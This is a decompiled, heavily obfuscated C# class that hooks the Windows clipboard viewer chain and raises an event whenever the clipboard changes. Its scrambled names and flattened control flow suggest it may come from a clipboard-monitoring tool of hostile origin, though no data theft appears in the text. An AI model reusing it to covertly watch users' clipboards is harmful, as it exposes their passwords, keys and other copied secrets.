using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Ch9qVeSrN4
{
	// Token: 0x02000019 RID: 25
	public class LOHPeZLPgq : NativeWindow
	{
		// Token: 0x06000058 RID: 88
		[DllImport("user32")]
		private static extern IntPtr SetClipboardViewer(IntPtr handle);

		// Token: 0x06000059 RID: 89
		[DllImport("user32")]
		private static extern bool ChangeClipboardChain(IntPtr handle, IntPtr next);

		// Token: 0x0600005A RID: 90
		[DllImport("user32")]
		private static extern long SendMessage(IntPtr handle, int code, IntPtr flags, IntPtr data);

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x0600005B RID: 91 RVA: 0x0000C20C File Offset: 0x0000A40C
		// (remove) Token: 0x0600005C RID: 92 RVA: 0x0000C334 File Offset: 0x0000A534
		public event LOHPeZLPgq.rVJ5AYTlMQV Changed
		{
			add
			{
				int num = 0;
				for (;;)
				{
					LOHPeZLPgq.rVJ5AYTlMQV rVJ5AYTlMQV;
					if (num == 1)
					{
						rVJ5AYTlMQV = this.vqkiP1;
						num = 2;
					}
					LOHPeZLPgq.rVJ5AYTlMQV rVJ5AYTlMQV2;
					LOHPeZLPgq.rVJ5AYTlMQV value2;
					if (num == 3)
					{
						value2 = (LOHPeZLPgq.rVJ5AYTlMQV)Delegate.Combine(rVJ5AYTlMQV2, value);
						num = 4;
					}
					if (num == 4)
					{
						rVJ5AYTlMQV = Interlocked.CompareExchange<LOHPeZLPgq.rVJ5AYTlMQV>(ref this.vqkiP1, value2, rVJ5AYTlMQV2);
						num = 5;
					}
					if (num != 5)
					{
						goto IL_C0;
					}
					if (rVJ5AYTlMQV == rVJ5AYTlMQV2)
					{
						num = 6;
						goto IL_C0;
					}
					goto IL_D1;
					IL_E2:
					if (num == 0)
					{
						num = 1;
					}
					if (num == 6)
					{
						break;
					}
					continue;
					IL_C0:
					if (num != 2)
					{
						goto IL_E2;
					}
					IL_D1:
					rVJ5AYTlMQV2 = rVJ5AYTlMQV;
					num = 3;
					goto IL_E2;
				}
			}
			remove
			{
				int num = 0;
				for (;;)
				{
					if (num != 5)
					{
						goto IL_35;
					}
					LOHPeZLPgq.rVJ5AYTlMQV rVJ5AYTlMQV;
					LOHPeZLPgq.rVJ5AYTlMQV rVJ5AYTlMQV2;
					if (rVJ5AYTlMQV == rVJ5AYTlMQV2)
					{
						num = 6;
						goto IL_35;
					}
					goto IL_AA;
					IL_BB:
					if (num == 1)
					{
						rVJ5AYTlMQV = this.vqkiP1;
						num = 2;
					}
					if (num == 0)
					{
						num = 1;
					}
					if (num == 6)
					{
						break;
					}
					continue;
					IL_35:
					if (num == 4)
					{
						LOHPeZLPgq.rVJ5AYTlMQV value2;
						rVJ5AYTlMQV = Interlocked.CompareExchange<LOHPeZLPgq.rVJ5AYTlMQV>(ref this.vqkiP1, value2, rVJ5AYTlMQV2);
						num = 5;
					}
					if (num == 3)
					{
						LOHPeZLPgq.rVJ5AYTlMQV value2 = (LOHPeZLPgq.rVJ5AYTlMQV)Delegate.Remove(rVJ5AYTlMQV2, value);
						num = 4;
					}
					if (num != 2)
					{
						goto IL_BB;
					}
					IL_AA:
					rVJ5AYTlMQV2 = rVJ5AYTlMQV;
					num = 3;
					goto IL_BB;
				}
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00006EA6 File Offset: 0x000050A6
		public LOHPeZLPgq()
		{
			this.CreateHandle(new CreateParams());
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000C45C File Offset: 0x0000A65C
		public void X74()
		{
			int num = 0;
			do
			{
				if (num == 1)
				{
					this.dusJIh = LOHPeZLPgq.SetClipboardViewer(base.Handle);
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000C4E0 File Offset: 0x0000A6E0
		public void emo()
		{
			int num = 0;
			do
			{
				if (num == 1)
				{
					LOHPeZLPgq.ChangeClipboardChain(base.Handle, this.dusJIh);
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x0000C564 File Offset: 0x0000A764
		protected override void WndProc(ref Message m)
		{
			int num = 0;
			for (;;)
			{
				if (num == 8)
				{
					goto IL_1F;
				}
				goto IL_44;
				IL_192:
				if (num == 7)
				{
					goto IL_7D;
				}
				if (num == 10)
				{
					goto IL_7D;
				}
				int msg;
				if (num == 1)
				{
					msg = m.Msg;
					num = 2;
				}
				if (num == 3)
				{
					if (msg == 781)
					{
						goto IL_1F;
					}
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 13)
				{
					break;
				}
				continue;
				IL_166:
				if (num == 5)
				{
					goto IL_177;
				}
				goto IL_192;
				IL_93:
				if (num == 9)
				{
					this.dusJIh = m.LParam;
					num = 10;
				}
				if (num == 6)
				{
					LOHPeZLPgq.SendMessage(this.dusJIh, m.Msg, m.WParam, m.LParam);
					num = 7;
				}
				if (num == 4)
				{
					goto IL_7D;
				}
				if (num == 11)
				{
					goto IL_133;
				}
				goto IL_166;
				IL_44:
				if (num == 2)
				{
					if (msg == 776)
					{
						goto IL_177;
					}
					num = 3;
				}
				if (num == 12)
				{
					goto IL_7D;
				}
				goto IL_93;
				IL_1F:
				if (m.WParam == this.dusJIh)
				{
					num = 9;
					goto IL_44;
				}
				goto IL_133;
				IL_177:
				this.vqkiP1(this);
				num = 6;
				goto IL_192;
				IL_133:
				LOHPeZLPgq.SendMessage(this.dusJIh, m.Msg, m.WParam, m.LParam);
				num = 12;
				goto IL_166;
				IL_7D:
				base.WndProc(ref m);
				num = 13;
				goto IL_93;
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000C7C8 File Offset: 0x0000A9C8
		protected override void Finalize()
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			try
			{
				this.emo();
			}
			finally
			{
				base.Finalize();
			}
		}

		// Token: 0x0400007B RID: 123
		private LOHPeZLPgq.rVJ5AYTlMQV vqkiP1;

		// Token: 0x0400007C RID: 124
		private IntPtr dusJIh;

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x06000063 RID: 99
		public delegate void rVJ5AYTlMQV(LOHPeZLPgq sender);
	}
}
